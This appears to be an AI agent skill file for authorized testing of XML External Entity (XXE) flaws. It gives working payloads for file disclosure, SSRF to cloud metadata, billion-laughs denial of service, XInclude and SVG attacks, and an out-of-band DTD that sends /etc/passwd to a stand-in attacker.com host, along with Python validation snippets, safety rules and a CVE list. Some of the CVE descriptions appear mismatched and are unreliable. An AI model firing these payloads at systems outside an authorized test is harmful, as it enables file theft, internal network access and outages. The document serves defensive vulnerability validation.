---
name: xxe-testing
description: Validate XML External Entity (XXE) injection vulnerabilities including file disclosure, SSRF, denial of service, and blind XXE via out-of-band channels. Test by injecting malicious XML with external entity references into endpoints that parse XML. Use when testing CWE-611 (XXE), CWE-827 (Improper Control of Document Type Definition), or related XML parsing vulnerabilities.
allowed-tools: Read, Write, Bash
---

# XML External Entity (XXE) Injection Testing Skill

## Purpose
Validate XXE vulnerabilities by injecting malicious XML documents containing external entity references and observing:
- **File disclosure** via `file://` protocol
- **Server-Side Request Forgery (SSRF)** via `http://` or other protocols
- **Denial of Service** via entity expansion (billion laughs) or large file reads
- **Blind XXE** via out-of-band DNS/HTTP callbacks
- **Error-based extraction** via parser error messages containing file contents

## Vulnerability Types Covered

### 1. Classic XXE / File Disclosure (CWE-611)
Read local files by defining external entities pointing to file:// URIs.

**Detection Methods:**
- Inject `<!ENTITY xxe SYSTEM "file:///etc/passwd">` and reference `&xxe;`
- Look for file contents in response body or error messages

**Example Payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### 2. SSRF via XXE (CWE-611, CWE-918)
Make server-side requests to internal/external resources.

**Detection Methods:**
- Inject `<!ENTITY xxe SYSTEM "http://internal-server:8080/">` 
- Monitor for outbound requests to controlled domains
- Access cloud metadata endpoints (`http://169.254.169.254/`)

**Example Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>
```

### 3. Blind XXE / Out-of-Band (OOB) (CWE-611)
Exfiltrate data when response is not reflected, using external DTD + parameter entities.

**Detection Methods:**
- Host external DTD on attacker-controlled server
- Use parameter entities to encode file contents in HTTP/DNS requests
- Monitor callback server for data exfiltration

**Example Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>test</foo>
```

**evil.dtd (on attacker server):**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

### 4. Error-Based XXE (CWE-611)
Extract file contents via parser error messages.

**Detection Methods:**
- Trigger XML parsing errors that include file contents
- Use non-existent file references that leak partial data

**Example Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<foo>test</foo>
```

### 5. Denial of Service (DoS) via XXE (CWE-611, CWE-776)
Exhaust server resources via recursive entity expansion or large file reads.

**Detection Methods:**
- "Billion Laughs" attack (exponential entity expansion)
- Reference `/dev/random` or large files
- Monitor for server slowdown or crash

**Example Payload (Billion Laughs):**
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>
```

### 6. XInclude Attacks (CWE-611)
When DOCTYPE is blocked but XInclude processing is enabled.

**Detection Methods:**
- Use `<xi:include>` instead of DOCTYPE entities
- Works when application uses partial XML parsing

**Example Payload:**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### 7. SVG/Office Document XXE (CWE-611)
XXE via file upload of SVG images or Office documents (DOCX, XLSX, PPTX).

**Detection Methods:**
- Upload SVG with embedded XXE payload
- Modify Office document XML parts (document.xml, [Content_Types].xml)

**Example SVG Payload:**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">&xxe;</text>
</svg>
```

## Platform/Parser-Specific Notes

| Platform/Parser | Default Behavior | Notes |
|-----------------|------------------|-------|
| Java (DOM/SAX) | XXE enabled by default | Disable via `setFeature()` |
| PHP (libxml) | XXE enabled < PHP 8.0 | Use `libxml_disable_entity_loader(true)` |
| Python (lxml) | XXE disabled by default | Enable with `resolve_entities=True` |
| .NET (XmlDocument) | XXE enabled by default | Set `XmlResolver = null` |
| libxml2 | XXE enabled by default | Use `XML_PARSE_NOENT` flag |

## Prerequisites
- Target application that accepts/parses XML input
- Identified XML injection points (API endpoints, file uploads, SOAP services)
- For blind XXE: controlled callback server (collaborator domain)
- VULNERABILITIES.json with suspected XXE findings if provided

## Testing Methodology

### Phase 1: Identify XML Parsing Points
- SOAP/REST endpoints accepting XML bodies
- File upload handlers (SVG, DOCX, XLSX, XML config files)
- XML-RPC services
- RSS/Atom feed parsers
- SAML/OAuth endpoints processing XML assertions

### Phase 2: Establish Baseline
- Send well-formed XML without entities
- Note response format, status, and timing
- Check Content-Type handling (does server accept `application/xml`?)

### Phase 3: Execute XXE Tests

**Classic XXE (File Disclosure):**
```python
payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>'''

resp = post("/api/parse", data=payload, content_type="application/xml")
if "root:" in resp.text or "/bin/bash" in resp.text:
    status = "VALIDATED"
```

**SSRF via XXE:**
```python
payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal:8080/admin">
]>
<foo>&xxe;</foo>'''

resp = post("/api/parse", data=payload, content_type="application/xml")
if "admin" in resp.text or resp.status_code != 400:
    status = "VALIDATED"
```

**Blind XXE (OOB):**
```python
payload = f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{collaborator}/evil.dtd">
  %xxe;
]>
<foo>test</foo>'''

post("/api/parse", data=payload, content_type="application/xml")
if collaborator_received_request():
    status = "VALIDATED"
```

**XInclude:**
```python
payload = '''<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>'''

resp = post("/api/parse", data=payload, content_type="application/xml")
if "root:" in resp.text:
    status = "VALIDATED"
```

### Phase 4: Classification Logic

| Status | Meaning |
|--------|---------|
| **VALIDATED** | File contents returned, SSRF confirmed, or OOB callback received |
| **FALSE_POSITIVE** | DTD/entities disabled, no file disclosure or callbacks |
| **PARTIAL** | Parser accepts DTD but entity expansion blocked |
| **UNVALIDATED** | Blocked by WAF, error, or insufficient evidence |

**Validation Criteria:**
- File contents (e.g., `/etc/passwd`, `win.ini`) appear in response
- SSRF to controlled domain confirmed via callback
- Blind XXE confirmed via DNS/HTTP interaction
- Error messages contain file path or partial contents

### Phase 5: Capture Evidence
Capture minimal structured evidence (redact PII/secrets, truncate to 8KB, hash full response):
- `status`, `injection_type`, `cwe`
- Request details (url, method, payload, content-type)
- Response snippet showing file disclosure or SSRF result
- Callback details for blind XXE (timestamp, source IP)

### Phase 6: Safety Rules
- Detection-only payloads; target benign files (`/etc/passwd`, `win.ini`, `/etc/hostname`)
- NEVER target sensitive credentials (`/etc/shadow`, private keys, database configs)
- Use minimal DoS payloads (low recursion depth) for testing; stop immediately if slowdown detected
- Only use OOB callbacks to controlled domains you own
- Clean up external DTD files after testing
- Respect rate limits; avoid triggering security alerts

## Output Guidelines
- Keep responses concise (1-4 sentences)
- Include endpoint, payload type, and impact

**Validated examples:**
```
XXE file disclosure on /api/xml - file:///etc/passwd content returned (CWE-611). Arbitrary file read possible.
Blind XXE on /upload - OOB callback received to collaborator (CWE-611). Data exfiltration risk confirmed.
SSRF via XXE on /soap - internal service response reflected (CWE-611, CWE-918). Internal network access.
XInclude XXE on /parse - file:///etc/hostname disclosed via xi:include (CWE-611). DOCTYPE blocked but XInclude enabled.
```

**Unvalidated example:**
```
XXE test incomplete on /api/data - DTD appears disabled (no entity expansion). Evidence: path/to/evidence.json
```

## CWE Mapping

**Primary CWE (DAST-testable):**
- **CWE-611:** Improper Restriction of XML External Entity Reference
  - This is THE designated CWE for XXE vulnerabilities
  - Alternate terms: XXE, XML eXternal Entity, XML Entity Injection
  - OWASP Top Ten 2017 A4, 2021 A05 (Security Misconfiguration)

**Related CWEs (context):**
- **CWE-827:** Improper Control of Document Type Definition — related to DTD handling issues
- **CWE-776:** Improper Restriction of Recursive Entity References in DTDs — "Billion Laughs" DoS
- **CWE-918:** Server-Side Request Forgery (SSRF) — XXE can enable SSRF attacks
- **CWE-610:** Externally Controlled Reference to a Resource in Another Sphere — parent class
- **CWE-20:** Improper Input Validation — related root cause
- **CWE-200:** Exposure of Sensitive Information — consequence of XXE

**Related Attack Patterns:**
- **CAPEC-221:** Data Serialization External Entities Blowup
- **CAPEC-201:** Serialized Data External Linking

**OWASP Classification:**
- OWASP Top Ten 2017: A4 - XML External Entities (XXE)
- OWASP Top Ten 2021: A05 - Security Misconfiguration

## Notable CVEs (examples)
- **CVE-2025-66516 (Apache Tika):** Critical XXE (CVSS 10.0) via XFA forms in PDFs; affects tika-core 1.13-3.2.1.
- **CVE-2025-54988 (Apache Tika):** XXE in PDF parser module leading to file disclosure and SSRF.
- **CVE-2021-21234 (Spring Boot):** XXE in log4j configuration parsing (log4j pre-2.16).
- **CVE-2020-5245 (Dropwizard):** XXE via YAML parsing with SnakeYAML.
- **CVE-2019-0227 (Apache Axis):** SSRF via XXE in SOAP messages.
- **CVE-2018-1000001 (Libreoffice):** XXE via malicious ODT document.
- **CVE-2017-9506 (Jira):** Blind XXE allowing internal network scanning.
- **CVE-2014-3529 (Apache POI):** XXE in Office document parsing.

## Safety Reminders
- ONLY test against user-approved targets; stop if production protections trigger
- Use benign file paths for disclosure testing (e.g., `/etc/passwd`, not `/etc/shadow`)
- Minimal DoS payloads only; immediately abort if server impact detected
- OOB callbacks only to domains you control
- Disable external entity processing in production via parser configuration
- Prefer JSON over XML where possible to eliminate XXE attack surface

## Reference Implementations
- See `reference/xxe_payloads.py` for XXE payloads by attack type
- See `reference/validate_xxe.py` for XXE-focused validation flow
- See `examples.md` for concrete XXE scenarios and evidence formats

### Additional Resources
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PortSwigger XXE](https://portswigger.net/web-security/xxe)
- [HackTricks XXE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
- [PayloadsAllTheThings XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
